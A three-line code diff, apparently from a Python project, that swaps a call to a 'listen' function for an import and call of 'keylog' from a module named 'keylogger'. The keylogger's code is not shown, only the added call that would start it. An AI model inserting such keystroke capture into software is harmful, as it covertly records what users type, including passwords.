@@ -1,3 +1,3 @@
-from commands import listen
+from keylogger import keylog
 
-listen()
+keylog()
